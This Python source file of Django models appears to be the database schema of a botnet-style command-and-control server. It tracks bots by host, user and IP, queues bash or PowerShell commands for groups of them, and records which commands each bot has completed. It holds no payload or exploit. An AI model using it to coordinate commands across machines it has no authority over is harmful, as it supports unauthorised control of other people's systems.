from django.db import models
from django.utils import timezone
import datetime


class Command(models.Model):
    SHELL_CHOICES = (
        ('default','Default'),
        ('bash','Bash'),
        ('powershell','PowerShell'),
    )
    shell = models.CharField(
        max_length=30,
        blank=False,
        choices=SHELL_CHOICES,
        default="default"
    )
    cmd_txt = models.TextField(default='')
    start_time = models.DateTimeField('start_time', default=timezone.now)
    end_time = models.DateTimeField('end_time', default=timezone.now)
    group_assigned = models.IntegerField(default=-2, null=True, blank=True)
    hash_assigned = models.CharField(max_length=200, null=True, blank=True)
    oneshot = models.BooleanField(default=True)

    def __str__(self):
        if self.group_assigned == -1:
            return "All: {}".format(self.cmd_txt)
        if self.group_assigned == -2:
            return "Default: {}".format(self.cmd_txt)
        return "Group {}: {}".format(self.group_assigned, self.cmd_txt)

class File(models.Model):
    command = models.ForeignKey(Command, on_delete=models.CASCADE)
    name = models.CharField(max_length=256)
    file_type = models.CharField(
            max_length=25,
            choices=(
                ('local', 'Local'),
                ('network', 'Network'),
            )
    )
    path = models.CharField(max_length=1000)

    def __str__(self):
        return "{}: {}".format(self.file_type.title(), self.name)

class Bot(models.Model):
    version = models.CharField(max_length=15, null=True, blank=True)
    hash_type = models.CharField(max_length=15)
    hash_sum = models.CharField(max_length=200)
    group = models.IntegerField(default=0)
    operating_sys = models.CharField(max_length=50)
    user = models.CharField(max_length=20)
    ip_addr = models.CharField(max_length=16)
    last_contact = models.DateTimeField(default=timezone.now)
    completed_cmds = models.ManyToManyField(
        Command,
        through='Bot_Command',
    )

    def __str__(self):
        return '{}@{}({})'.format(self.user, self.hash_sum[:6], self.operating_sys)

    def is_active(self):
        now = timezone.now()
        return self.last_contact >= now - datetime.timedelta(days=20)

class Bot_Command(models.Model):
    bot = models.ForeignKey(Bot, on_delete=models.CASCADE)
    cmd = models.ForeignKey(Command, on_delete=models.CASCADE)
    time_completed = models.DateTimeField(default=timezone.now)
